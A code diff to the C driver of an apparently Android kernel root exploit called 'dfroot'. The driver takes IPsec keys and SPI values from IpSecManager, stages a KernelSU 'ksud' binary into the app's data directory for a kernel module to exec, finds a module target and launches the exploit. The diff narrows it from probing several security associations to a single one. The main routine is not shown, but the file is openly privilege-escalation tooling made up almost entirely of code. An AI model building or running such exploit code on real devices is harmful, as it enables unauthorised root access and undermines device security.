@@ -11,13 +11,12 @@
 
 #include "reporter.h"
 
-#define MAX_SAS 4
+/* The LKM execs this path, so the staged manager ksud has to land here. */
+#define KSUD_DEST "/data/user_de/0/df.root/ksud"
 
-int dfroot_run(int encap_port, int sender_port,
-               const uint32_t spi[MAX_SAS], const int icv_len[MAX_SAS], int nsa,
+int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
-               const char *ko_target, const char *package_name, int soft_reboot,
-               int stage, int no_vr);
+               const char *ko_target, const char *package_name, int soft_reboot);
 
 extern const char *g_data_dir;
 
@@ -58,41 +57,59 @@ static const char *detect_ko_target(void) {
     return candidates[0];
 }
 
-static void usage(const char *argv0) {
-    fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N[,N,...] "
-            "--icv-len N[,N,...] --aes-key HEX "
-            "--hmac-key HEX --ksud-src PATH --pkg NAME [--soft-reboot]"
-            " [--stage N]\n"
-            "  the SA parameters come from IpSecManager, which installs the\n"
-            "  transform on the app's behalf. Each SPI/ICV pair is probed in\n"
-            "  order and the first one that decrypts runs the exploit\n", argv0);
+static int copy_file(const char *src, const char *dst) {
+    int in = open(src, O_RDONLY);
+    if (in < 0) {
+        REPORTLN("open %s failed: %s", src, strerror(errno));
+        return -1;
+    }
+    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    if (out < 0) {
+        REPORTLN("open %s failed: %s", dst, strerror(errno));
+        close(in);
+        return -1;
+    }
+    char buf[65536];
+    ssize_t n;
+    while ((n = read(in, buf, sizeof(buf))) > 0) {
+        char *p = buf;
+        while (n > 0) {
+            ssize_t w = write(out, p, (size_t)n);
+            if (w < 0) {
+                REPORTLN("write %s failed: %s", dst, strerror(errno));
+                close(in);
+                close(out);
+                return -1;
+            }
+            p += w;
+            n -= w;
+        }
+    }
+    close(in);
+    close(out);
+    if (chmod(dst, 0755) != 0) {
+        REPORTLN("chmod %s failed: %s", dst, strerror(errno));
+        return -1;
+    }
+    return 0;
 }
 
-/* Parse "1,2,3" into ints; returns the count, at most max, 0 on garbage. */
-static int parse_int_list(const char *s, long *out, int max) {
-    int n = 0;
-    while (*s && n < max) {
-        char *end;
-        long v = strtol(s, &end, 0);
-        if (end == s) return 0;
-        out[n++] = v;
-        s = (*end == ',') ? end + 1 : end;
-    }
-    return *s ? 0 : n;
+static void usage(const char *argv0) {
+    fprintf(stderr,
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX "
+            "--hmac-key HEX --ksud-src PATH --pkg NAME [--soft-reboot]\n"
+            "  the SA parameters come from IpSecManager, which installs the\n"
+            "  transform on the app's behalf\n", argv0);
 }
 
 int main(int argc, char **argv) {
-    int encap_port = 0, sender_port = 0;
-    uint32_t spi[MAX_SAS] = {0};
-    int icv_len[MAX_SAS] = {0}, nsa = 0;
+    int encap_port = 0, sender_port = 0, icv_len = 16;
+    uint32_t spi = 0;
     uint8_t aes_key[32], hmac_key[32];
     int have_aes = 0, have_hmac = 0;
     const char *ksud_src = NULL;
     const char *package_name = NULL;
     int soft_reboot = 0;
-    int stage = 0;
-    int no_vr = 0;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -100,24 +117,10 @@ int main(int argc, char **argv) {
             encap_port = atoi(argv[++i]);
         else if (!strcmp(a, "--sender-port") && i + 1 < argc)
             sender_port = atoi(argv[++i]);
-        else if (!strcmp(a, "--spi") && i + 1 < argc) {
-            const char *s = argv[++i];
-            int m = 0;
-            while (*s && m < MAX_SAS) {
-                char *end;
-                unsigned long v = strtoul(s, &end, 0);
-                if (end == s) break;
-                spi[m++] = (uint32_t)v;
-                s = (*end == ',') ? end + 1 : end;
-            }
-            nsa = m;
-        }
-        else if (!strcmp(a, "--icv-len") && i + 1 < argc) {
-            long vals[MAX_SAS];
-            int m = parse_int_list(argv[++i], vals, MAX_SAS);
-            if (m <= 0) { usage(argv[0]); return 2; }
-            for (int k = 0; k < m; k++) icv_len[k] = (int)vals[k];
-        }
+        else if (!strcmp(a, "--spi") && i + 1 < argc)
+            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
+        else if (!strcmp(a, "--icv-len") && i + 1 < argc)
+            icv_len = atoi(argv[++i]);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
         else if (!strcmp(a, "--hmac-key") && i + 1 < argc)
@@ -126,10 +129,6 @@ int main(int argc, char **argv) {
             ksud_src = argv[++i];
         else if (!strcmp(a, "--pkg") && i + 1 < argc)
             package_name = argv[++i];
-        else if (!strcmp(a, "--stage") && i + 1 < argc)
-            stage = atoi(argv[++i]);
-        else if (!strcmp(a, "--no-vr"))
-            no_vr = 1;
         else if (!strcmp(a, "--soft-reboot"))
             soft_reboot = 1;
         else {
@@ -137,37 +136,27 @@ int main(int argc, char **argv) {
             return 2;
         }
     }
-    if (!encap_port || !sender_port || !spi[0] || !icv_len[0] || !have_aes ||
-        !have_hmac || !ksud_src || !package_name) {
+    if (!encap_port || !sender_port || !spi || !have_aes || !have_hmac ||
+        !ksud_src || !package_name) {
         usage(argv[0]);
         return 2;
     }
 
     REPORTLN("=== setup ===");
     REPORTLN("encap port: %d", encap_port);
-    for (int k = 0; k < nsa; k++)
-        REPORTLN("spi[%d]: 0x%x icv: %d", k, spi[k], icv_len[k]);
-    if (stage)
-        REPORTLN("stage: %d", stage);
-    if (no_vr)
-        REPORTLN("disable_vr: on");
-    /* The app copies the manager's ksud here before either run mode, because
-     * under Shizuku this process is shell and can read neither /data/app nor
-     * the app's dir. Root is what execs it, so no further staging is needed. */
-    REPORTLN("ksud: %s", ksud_src);
+    REPORTLN("spi: 0x%x", spi);
+    if (copy_file(ksud_src, KSUD_DEST) != 0)
+        return 1;
+    REPORTLN("ksud staged to: %s (manager: %s)", KSUD_DEST, ksud_src);
 
-    /* dfprobe is written next to the staged ksud, or /data/local/tmp under
-     * Shizuku where the app's dir is not writable. */
-    g_data_dir = access("/data/user_de/0/df.root", W_OK) == 0
-                     ? "/data/user_de/0/df.root"
-                     : "/data/local/tmp";
+    /* dfprobe is written next to the staged ksud, in the app's own f2fs dir. */
+    g_data_dir = "/data/user_de/0/df.root";
 
     const char *ko_target = detect_ko_target();
     REPORTLN("found ko_target: %s", ko_target);
 
     REPORTLN("");
     REPORTLN("=== exploit ===");
-    return dfroot_run(encap_port, sender_port, spi, icv_len, nsa,
-                      aes_key, hmac_key,
-                      ko_target, package_name, soft_reboot, stage, no_vr);
+    return dfroot_run(encap_port, sender_port, spi, icv_len, aes_key, hmac_key,
+                      ko_target, package_name, soft_reboot);
 }
